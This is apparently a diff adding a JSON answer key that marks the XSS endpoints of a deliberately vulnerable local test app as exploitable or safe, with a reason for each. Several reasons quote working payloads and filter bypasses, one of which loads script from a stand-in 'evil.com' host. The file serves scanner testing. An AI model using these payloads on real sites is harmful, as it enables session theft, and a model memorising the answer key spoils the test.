@@ -1,0 +1,138 @@
+{
+  "_meta": {
+    "description": "Authoritative endpoint vulnerability ground truth. Source: source code analysis of exploitable/app.py.",
+    "target": "http://localhost:5050",
+    "last_verified": "2026-03-22",
+    "methodology": "Each endpoint's source code was analyzed: (1) is the input HTML-escaped? (2) is the injection point in an executable context? (3) can standard XSS payloads trigger JS execution in modern browsers?"
+  },
+  "endpoints": {
+    "reflected-body": {
+      "category": "Reflected",
+      "url": "/reflected/body",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Jinja2 template uses `{{ q | safe }}` \u2014 raw HTML injection. No escaping."
+    },
+    "reflected-script": {
+      "category": "Reflected",
+      "url": "/reflected/script",
+      "params": [
+        "name"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Raw f-string injected into JS string literal: `var username = '{name}'`. No escaping."
+    },
+    "reflected-attr-unquoted": {
+      "category": "Reflected",
+      "url": "/reflected/attribute-unquoted",
+      "params": [
+        "color"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Raw f-string into unquoted HTML attribute: `style=background-color:{color}`. Event handlers execute."
+    },
+    "reflected-href": {
+      "category": "Reflected",
+      "url": "/reflected/href",
+      "params": [
+        "url"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Raw f-string into href attribute. `javascript:` URIs execute when link is clicked."
+    },
+    "reflected-iframe": {
+      "category": "Reflected",
+      "url": "/reflected/iframe",
+      "params": [
+        "src"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Raw f-string into iframe src attribute. `javascript:` URIs execute in iframe context."
+    },
+    "reflected-multiparams": {
+      "category": "Reflected",
+      "url": "/reflected/multiparams",
+      "params": [
+        "a",
+        "b",
+        "c"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Raw f-string into HTML body `<p>a = {a}</p>` AND JS object `var debug = {a: \"{a}\"}`. No escaping."
+    },
+    "reflected-meta": {
+      "category": "Reflected",
+      "url": "/reflected/meta",
+      "params": [
+        "redir"
+      ],
+      "expected": "Safe",
+      "reasoning": "Injected into `<meta http-equiv=\"refresh\" content=\"5;url={redir}\">`. Chrome and Firefox do NOT execute `javascript:` URIs in meta refresh context since ~2017."
+    },
+    "bypass-double-encode": {
+      "category": "Bypass",
+      "url": "/bypass/double-encode",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Server double-decodes: `urllib.parse.unquote(q)` after Flask's single decode. Double-encoded scripts pass through and are reflected raw into HTML body via `_bypass_page()`."
+    },
+    "bypass-quote-escape": {
+      "category": "Bypass",
+      "url": "/bypass/quote-escape",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Escapes `\"` and `'` but leaves angle brackets untouched. `<img src=x onerror=alert(1)>` passes through unfiltered into raw HTML body."
+    },
+    "bypass-blacklist": {
+      "category": "Bypass",
+      "url": "/bypass/blacklist",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Only strips literal `<script>` and `</script>`. `<img src=x onerror=alert(1)>` passes through unfiltered into raw HTML body."
+    },
+    "bypass-case": {
+      "category": "Bypass",
+      "url": "/bypass/case",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Blocks lowercase `<script>` but `<ScRiPt>alert(1)</ScRiPt>` passes through unfiltered into raw HTML body."
+    },
+    "bypass-angle-only": {
+      "category": "Bypass",
+      "url": "/bypass/angle-only",
+      "params": [
+        "q"
+      ],
+      "expected": "Safe",
+      "reasoning": "Strips `<` and `>` so no HTML tags possible. Input reflected into `data-value=\"{filtered}\"` \u2014 can break out of attribute but `autofocus onfocus` doesn't work on `<div>` without `tabindex` in any modern browser."
+    },
+    "bypass-waf-sim": {
+      "category": "Bypass",
+      "url": "/bypass/waf-sim",
+      "params": [
+        "q"
+      ],
+      "expected": "Vuln",
+      "reasoning": "Blocks keywords: alert, prompt, confirm, eval, onerror, onload. But `<script>fetch('http://evil.com')</script>` or `<script src=//evil.com></script>` have NO blocked keywords and execute in HTML body."
+    },
+    "mutation-innerhtml": {
+      "category": "Mutation",
+      "url": "/mutation/innerhtml",
+      "params": [
+        "html"
+      ],
+      "expected": "Safe",
+      "reasoning": "Server strips `<script>` tags AND `on*` attributes via regex. Sanitized output goes through `| tojson` (JSON encoding) before being set via `.innerHTML`. No `<script>` or event handlers survive. Standard mXSS vectors like SVG namespace tricks don't work because `on*` regex catches all event attributes."
+    }
+  }
+}
